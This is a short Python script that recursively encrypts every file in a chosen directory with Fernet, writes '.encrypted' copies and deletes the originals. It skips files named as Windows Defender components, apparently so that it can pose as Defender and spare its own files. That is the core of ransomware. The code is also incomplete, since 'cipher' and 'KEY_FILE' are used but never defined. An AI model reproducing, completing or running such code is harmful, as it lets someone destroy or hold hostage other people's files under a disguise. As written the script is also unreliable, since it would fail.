import os
from cryptography.fernet import Fernet
from pathlib import Path

# Define the list of files to exclude from encryption
EXCLUDED_FILES = {
    "windows-defender.png",
    "windows-defender.exe",
    "Windows-defender.def",
    "windows-defender.pap",
    "windows-defender-license.txt",
    "license"
}

# Function to encrypt a file
def encrypt_file(file_path):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = cipher.encrypt(file_data)
        # Write the encrypted data back to the file with a new extension
        encrypted_file_path = f"{file_path}.encrypted"
        with open(encrypted_file_path, "wb") as file:
            file.write(encrypted_data)
        # Optionally, remove the original file after encryption
        os.remove(file_path)
        print(f"Encrypted: {file_path} -> {encrypted_file_path}")
    except Exception as e:
        print(f"Error encrypting {file_path}: {str(e)}")

# Function to walk through directories and encrypt files
def encrypt_directory(directory_path):
    for root, dirs, files in os.walk(directory_path):
        for file_name in files:
            # Check if the file is in the excluded list
            if file_name in EXCLUDED_FILES:
                print(f"Skipped (excluded): {file_name}")
                continue
            # Check if the file is already encrypted
            if file_name.endswith(".encrypted"):
                print(f"Skipped (already encrypted): {file_name}")
                continue
            # Get the full file path
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path)

if __name__ == "__main__":
    # Specify the directory to start encryption (e.g., current directory)
    target_directory = input("Enter the directory path to encrypt (default is current directory): ") or os.getcwd()
    print(f"Starting encryption process in: {target_directory}")
    encrypt_directory(target_directory)
    print("Encryption process completed.")
    print(f"Encryption key saved to: {KEY_FILE}. Keep this secure to decrypt files later.")
